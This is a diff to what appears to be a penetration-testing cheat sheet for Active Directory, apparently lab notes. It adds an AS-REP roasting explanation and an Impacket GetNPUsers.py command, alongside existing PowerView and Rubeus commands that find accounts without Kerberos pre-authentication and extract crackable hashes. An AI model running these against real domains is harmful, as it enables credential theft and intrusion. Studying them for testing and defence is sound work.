@@ -352,9 +352,13 @@ Restart-Service WinRM
   Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
 ```
 **ASREPROasting**
+- Possible for accounts that do not have require kerberos pre-authentication enabled
 ```
 Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+```
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
 ```
 
 
